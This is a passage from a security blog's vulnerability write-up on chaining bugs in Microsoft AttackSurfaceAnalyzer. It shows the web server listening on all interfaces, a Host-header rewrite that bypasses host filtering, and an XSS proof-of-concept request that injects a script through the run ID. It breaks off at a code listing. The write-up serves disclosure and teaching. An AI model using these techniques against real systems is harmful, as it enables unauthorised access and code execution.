<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Chaining Three Bugs to Get RCE in Microsoft AttackSurfaceAnalyzer</title>
<link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.134.1"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image:src content="https://parsiya.net/blog/2019-06-18-chaining-three-bugs-to-get-rce-in-microsoft-attacksurfaceanalyzer/11-localhost.gif"><meta name=twitter:title content="Chaining Three Bugs to Get RCE in Microsoft AttackSurfaceAnalyzer"><meta name=twitter:description content="This is a blog post about how I found three vulns and chained them to get RCE in
the Microsoft
AttackSurfaceAnalyzer (ASA
moving forward) GUI version.

ASA uses Electron.NET which
binds the internal Kestrel web server to 0.0.0.0. If permission is given to
bypass the Windows OS firewall (or if used on an OS without one), a remote
attacker can connect to it and access the application.
The web application is vulnerable to Cross-Site Scripting (XSS). A remote
attacker can submit a runID with embedded JavaScript that is executed by
the victim using the ASA Electron application.
Electron.NET does not have the NodeIntegration flag set to false. This
allows the JavaScript payload to spawn up processes on the victim's machine.
"><meta name=twitter:domain content="parsiya.net"><meta name=twitter:creator content="@CryptoGangsta"></head><body><header role=banner><hgroup><h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation><fieldset class=mobile-nav><select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select></fieldset><ul class=main-navigation><li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription><a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a></ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer"><fieldset role=search><input class=search type=text name=q results=0 placeholder=Search>
<input type=hidden name=q value=site:https://parsiya.net/></fieldset></form></nav><div id=main><div id=content><div><article class=hentry role=article><header><p class=meta>Jun 18, 2019
- 10 minute read
- <a href=https://parsiya.net/blog/2019-06-18-chaining-three-bugs-to-get-rce-in-microsoft-attacksurfaceanalyzer/#disqus_thread>Comments</a>
- <a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/electron/>electron</a></p><h1 class=entry-title>Chaining Three Bugs to Get RCE in Microsoft AttackSurfaceAnalyzer</h1></header><div class=entry-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#what-is-attacksurfaceanalyzer-asa>What is AttackSurfaceAnalyzer (ASA)?</a></li><li><a href=#electron-electron-everywhere>Electron, Electron EveryWhere!</a></li><li><a href=#running-asa>Running ASA</a></li><li><a href=#vuln-1-listening-on-all-interfaces>Vuln 1: Listening on All Interfaces</a><ul><li><a href=#kestrels-host-filtering>Kestrel's Host Filtering</a></li></ul></li><li><a href=#vuln2-cross-site-scripting>Vuln2: Cross-Site Scripting</a><ul><li><a href=#xss-root-cause-analysis>XSS Root Cause Analysis</a></li><li><a href=#xss-in-guest-from-remote-payloads>XSS in Guest from Remote Payloads</a></li></ul></li><li><a href=#vuln-3-xss-to-rce-via-nodeintegration>Vuln 3: XSS to RCE via NodeIntegration</a><ul><li><ul><li><a href=#the-rce-payload>The RCE Payload</a></li><li><a href=#funky-gifs>Funky Gifs</a></li></ul></li></ul></li><li><a href=#the-good-and-the-bad>The Good and the Bad</a></li><li><a href=#how-can-we-fix-this>How Can We Fix This?</a><ul><li><a href=#fixes>Fixes</a></li></ul></li><li><a href=#timeline>Timeline</a></li></ul></nav><p>This is a blog post about how I found three vulns and chained them to get RCE in
the Microsoft
<a href=https://github.com/microsoft/AttackSurfaceAnalyzer target=_blank rel="noreferrer noopener">AttackSurfaceAnalyzer</a> (ASA
moving forward) GUI version.</p><ol><li>ASA uses <a href=https://github.com/ElectronNET/Electron.NET target=_blank rel="noreferrer noopener">Electron.NET</a> which
binds the internal Kestrel web server to <code>0.0.0.0</code>. If permission is given to
bypass the Windows OS firewall (or if used on an OS without one), a remote
attacker can connect to it and access the application.</li><li>The web application is vulnerable to Cross-Site Scripting (XSS). A remote
attacker can submit a runID with embedded JavaScript that is executed by
the victim using the ASA Electron application.</li><li>Electron.NET does not have the <code>NodeIntegration</code> flag set to false. This
allows the JavaScript payload to spawn up processes on the victim's machine.</li></ol><h1 id=background>Background
<a class=header-link href=#background><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Around a month ago someone posted a link to the new version of the
tool from Microsoft.</p><p><a href=https://twitter.com/mattt_cyber target=_blank rel="noreferrer noopener">Matt</a> who is my ultimate boss said:</p><blockquote><p>Wrote the first version of that with John Lambert over a holiday break...</p></blockquote><p>Edit: See their conversation about the tool and a link to a presentation talking about it at:</p><ul><li><a href=https://twitter.com/JohnLaTwC/status/1141765341061627904 target=_blank rel="noreferrer noopener">https://twitter.com/JohnLaTwC/status/1141765341061627904</a></li></ul><p>I had never seen the tool before but I had used an internal tool which basically
did the same thing and more.</p><h1 id=what-is-attacksurfaceanalyzer-asa>What is AttackSurfaceAnalyzer (ASA)?
<a class=header-link href=#what-is-attacksurfaceanalyzer-asa><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>According to Microsoft</p><blockquote><p>Attack Surface Analyzer takes a snapshot of your system state before and after
the installation of other software product(s) and displays changes to a number
of key elements of the system attack surface.</p></blockquote><p>You run it before you install an application/service and then after. Finally,
you can compare these two runs to see what the application has installed on the
machine.</p><p>ASA is typically run as root/admin. Because the application needs as much access
as possible to document and monitor changes to the machine.</p><h1 id=electron-electron-everywhere>Electron, Electron EveryWhere!
<a class=header-link href=#electron-electron-everywhere><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>The new version of the application is based on <a href=https://electronjs.org/ target=_blank rel="noreferrer noopener">Electron</a>.
Electron is a framework for packaging webapps as desktop applications. Think of
it as a Chromium instance opening your webapp running locally. To learn more
about Electron, please read any of the many tutorials.</p><p>Electron apps are very popular. I am writing this text in VS Code which is
another Electron app.</p><p>ASA uses <a href=https://github.com/ElectronNET/Electron.NET target=_blank rel="noreferrer noopener">Electron.NET</a> which "is a wrapper around a
"normal" Electron application with an embedded ASP.NET Core application." I am
not very familiar with the inner-workings of either framework but it looks like
it runs a local <a href=https://docs.microsoft.com/en-us/aspnet/core/fundamentals/servers/kestrel target=_blank rel="noreferrer noopener">Kestrel</a> web server and then opens an ASP.NET web
application via Electron.</p><h1 id=running-asa>Running ASA
<a class=header-link href=#running-asa><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>I downloaded <a href=https://github.com/microsoft/AttackSurfaceAnalyzer/releases/tag/v2.0.143%2Bfe41ced7df target=_blank rel="noreferrer noopener">ASA v2.0.143</a> and started it in a Windows VM from
<a href=https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ target=_blank rel="noreferrer noopener">modern.ie</a>. ASA should be run as admin to get the most visibility
into the system/application.</p><p>After running ASA in an admin prompt. I saw the Windows Firewall alert.</p><span class=caption-wrapper><img class=caption src=01-firewall-req.png title="First Run" alt="First Run">
<span class=caption-text>First Run</span></span><p>This was strange. Why would a local Electron app need to open Firewall ports?
Looking at the command prompt, I saw the culprit.</p><pre tabindex=0><code>C:\Users\IEUser\Downloads\AsaGui-windows-2.0.141&gt;
 Electron Socket IO Port: 8000
Electron Socket started on port 8000 at 127.0.0.1
ASP.NET Core Port: 8001
stdout: Use Electron Port: 8000

stdout: Hosting environment: Production
Content root path: C:\Users\IEUser\Downloads\AsaGui-windows-2.0.141\resources\app\bin\
Now listening on: http://0.0.0.0:8001
Application started. Press Ctrl+C to shut down.
</code></pre><p>The Kestrel web server is listening on all interfaces on port <code>8001</code>. The port
is not static, we can see in the application's source code that it starts from
port 8000 and uses the first two available ports. The first is used by Electron
and the second by the Kestrel web server. In a typical scenario, the ports will
be <code>8000</code> and <code>8001</code>.</p><ul><li><a href=https://github.com/ElectronNET/Electron.NET/blob/131d1d9dd115d480b2c65353d44b9433b8b874f2/ElectronNET.Host/main.js#L141 target=_blank rel="noreferrer noopener">Electron.NET/ElectronNET.Host/main.js#L141</a></li></ul><figure class=code><figcaption><span>title</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#268bd2>function</span> startAspCoreBackend(electronPort) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>// hostname needs to be localhost, otherwise Windows Firewall will be triggered.
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>portscanner.findAPortNotInUse(<span style=color:#2aa198>8000</span>, <span style=color:#2aa198>65535</span>, <span style=color:#2aa198>&#39;localhost&#39;</span>, <span style=color:#268bd2>function</span> (error, electronWebPort) {
</span></span><span style=display:flex><span>    console.log(<span style=color:#2aa198>&#39;ASP.NET Core Port: &#39;</span> <span style=color:#719e07>+</span> electronWebPort);
</span></span><span style=display:flex><span>    loadURL <span style=color:#719e07>=</span> <span style=color:#586e75>`http://localhost:</span><span style=color:#2aa198>${</span>electronWebPort<span style=color:#2aa198>}</span><span style=color:#586e75>`</span>;
</span></span><span style=display:flex><span>    <span style=color:#268bd2>const</span> parameters <span style=color:#719e07>=</span> [<span style=color:#586e75>`/electronPort=</span><span style=color:#2aa198>${</span>electronPort<span style=color:#2aa198>}</span><span style=color:#586e75>`</span>, <span style=color:#586e75>`/electronWebPort=</span><span style=color:#2aa198>${</span>electronWebPort<span style=color:#2aa198>}</span><span style=color:#586e75>`</span>];
</span></span><span style=display:flex><span>    <span style=color:#268bd2>let</span> binaryFile <span style=color:#719e07>=</span> manifestJsonFile.executable;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#268bd2>const</span> os <span style=color:#719e07>=</span> require(<span style=color:#2aa198>&#39;os&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#719e07>if</span> (os.platform() <span style=color:#719e07>===</span> <span style=color:#2aa198>&#39;win32&#39;</span>) {
</span></span><span style=display:flex><span>        binaryFile <span style=color:#719e07>=</span> binaryFile <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;.exe&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#268bd2>let</span> binFilePath <span style=color:#719e07>=</span> path.join(currentBinPath, binaryFile);
</span></span><span style=display:flex><span>    <span style=color:#268bd2>var</span> options <span style=color:#719e07>=</span> { cwd<span style=color:#719e07>:</span> currentBinPath };
</span></span><span style=display:flex><span>    <span style=color:#586e75>// Run the binary with params and options.
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>    apiProcess <span style=color:#719e07>=</span> process(binFilePath, parameters, options);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    apiProcess.stdout.on(<span style=color:#2aa198>&#39;data&#39;</span>, (data) =&gt; {
</span></span><span style=display:flex><span>        console.log(<span style=color:#586e75>`stdout: </span><span style=color:#2aa198>${</span>data.toString()<span style=color:#2aa198>}</span><span style=color:#586e75>`</span>);
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>}</span></span></code></pre></td></tr></table></div></div></div></figure><p>These ports are passed to the binary as command line parameters. The binary file
is located at <code>AsaGui-windows-2.0.141/resources/app/bin/electron.manifest.json</code>
in a key named <code>executable</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;executable&#34;</span>: <span style=color:#2aa198>&#34;AttackSurfaceAnalyzer-GUI&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Using procmon (use the filter <code>Process Name is AttackSurfaceAnalyzer-GUI</code> or use
<code>Tools > Process Tree</code>) we can see the parameters in action.</p><ul><li><code>AttackSurfaceAnalyzer-GUI.exe /electronPort=8000 /electronWebPort=8001</code></li></ul><span class=caption-wrapper><img class=caption src=02-cmd-params.png title="Command line parameters" alt="Command line parameters">
<span class=caption-text>Command line parameters</span></span><p>We can manually go to <code>localhost:8001</code> to see the application in the browser and
interact with it.</p><span class=caption-wrapper><img class=caption src=03-asa-in-browser.png title="ASA in browser" alt="ASA in browser">
<span class=caption-text>ASA in browser</span></span><h1 id=vuln-1-listening-on-all-interfaces>Vuln 1: Listening on All Interfaces
<a class=header-link href=#vuln-1-listening-on-all-interfaces><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>The Kestrel web server listening on all interfaces. If it gets permission to
open ports or if you do not have a firewall (disable on Windows or
running on an OS without one), anyone can connect to it from outside.</p><p>I created a host-only network interface between the guest VM and the host. After
navigating to the guest IP in the host's browser at <code>192.168.56.101:8001</code>, I got
the following error:</p><ul><li><code>HTTP Error 400. The request hostname is invalid.</code></li></ul><span class=caption-wrapper><img class=caption src=04-hostname-invalid.png title="Hostname is invalid" alt="Hostname is invalid">
<span class=caption-text>Hostname is invalid</span></span><p>Or in Burp:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>HTTP/1.1 400 Bad Request
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Date: Tue, 21 May 2019 20:14:36 GMT
</span></span><span style=display:flex><span>Content-Type: text/html
</span></span><span style=display:flex><span>Server: Kestrel
</span></span><span style=display:flex><span>Content-Length: 334
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34;&#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>HTML</span>&gt;&lt;<span style=color:#268bd2>HEAD</span>&gt;&lt;<span style=color:#268bd2>TITLE</span>&gt;Bad Request&lt;/<span style=color:#268bd2>TITLE</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>META</span> HTTP-EQUIV<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;Content-Type&#34;</span> Content<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;text/html; charset=us-ascii&#34;</span>&gt;&lt;/ <span style=color:#268bd2>HEAD</span> &gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>BODY</span>&gt;&lt;<span style=color:#268bd2>h2</span>&gt;Bad Request - Invalid Hostname&lt;/<span style=color:#268bd2>h2</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>hr</span>&gt;&lt;<span style=color:#268bd2>p</span>&gt;HTTP Error 400. The request hostname is invalid.&lt;/<span style=color:#268bd2>p</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>BODY</span>&gt;&lt;/<span style=color:#268bd2>HTML</span>&gt;
</span></span></code></pre></div><p>Note the <code>Server: Kestrel</code> response header which is not really secret
information.</p><h2 id=kestrels-host-filtering>Kestrel's Host Filtering
<a class=header-link href=#kestrels-host-filtering><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Kestrel has a host filtering middleware. Read more about it at:</p><ul><li><a href=https://docs.microsoft.com/en-us/aspnet/core/fundamentals/servers/kestrel#host-filtering target=_blank rel="noreferrer noopener">Kestrel web server implementation in ASP.NET Core - Host Filtering</a></li></ul><p>It filters incoming requests by the <code>Host</code> header. We can use a simple
<code>Proxy > Options > Match and Replace</code> rule in Burp to convert our requests'
<code>Host</code> header from <code>192.168.56.101:8001</code> to <code>localhost:8001</code> and access the web
application remotely.</p><span class=caption-wrapper><img class=caption src=05-bypass-host-filtering.png title="Bypass Host Filtering" alt="Bypass Host Filtering">
<span class=caption-text>Bypass Host Filtering</span></span><p>This setting is enabled inside
<code>AsaGui-windows-2.0.141/resources/app/bin/appsettings.json</code> via <code>AllowedHosts</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;Logging&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;LogLevel&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;Default&#34;</span>: <span style=color:#2aa198>&#34;Warning&#34;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;AllowedHosts&#34;</span>: <span style=color:#2aa198>&#34;localhost&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;ApplicationInsights&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;InstrumentationKey&#34;</span>: <span style=color:#2aa198>&#34;79fc14e7-936c-4dcf-ba66-9a4da6e341ef&#34;</span>
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h1 id=vuln2-cross-site-scripting>Vuln2: Cross-Site Scripting
<a class=header-link href=#vuln2-cross-site-scripting><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>The application does not have a lot of injection points. User input is very
limited. We can submit scans and then analyze them. We can export the results in
specific paths and create reports.</p><p>The <code>Run Id</code> is pretty much the only place with user input. Let's try a basic
injection script and submit a run. When submitting a run, select something
simple like <code>Certificates</code> for quick runs.</p><p>Note: Run Ids are stored in a SQLite database and must be unique per app.</p><span class=caption-wrapper><img class=caption src=06-xss-in-browser.png title="XSS in Browser" alt="XSS in Browser">
<span class=caption-text>XSS in Browser</span></span><p>Oops!</p><h2 id=xss-root-cause-analysis>XSS Root Cause Analysis
<a class=header-link href=#xss-root-cause-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>This is the request to submit our previous run.</p><pre tabindex=0><code>http://192.168.56.101:8001/Home/StartCollection?Id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;
File=false&amp;Port=false&amp;Service=false&amp;User=false&amp;Registry=false&amp;Certificates=true
</code></pre><p>The application then calls <code>GetCollectors</code> to get information about the current
run and display progress.</p><ul><li>http://192.168.56.101:8001/Home/GetCollectors</li></ul><p>The response to the app is a string containing a JSON object. The beautified
version of our test run is:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;RunId&#34;</span>: <span style=color:#2aa198>&#34;&lt;script&gt;alert(1)&lt;/script&gt;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;Runs&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;CertificateCollector&#34;</span>: <span style=color:#2aa198>3</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The value of <code>RunId</code> is injected directly into the web page. The culprit is at
<code>js/Collect.js:174</code>:</p><figure class=code><figcaption><span>GetCollectors()</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
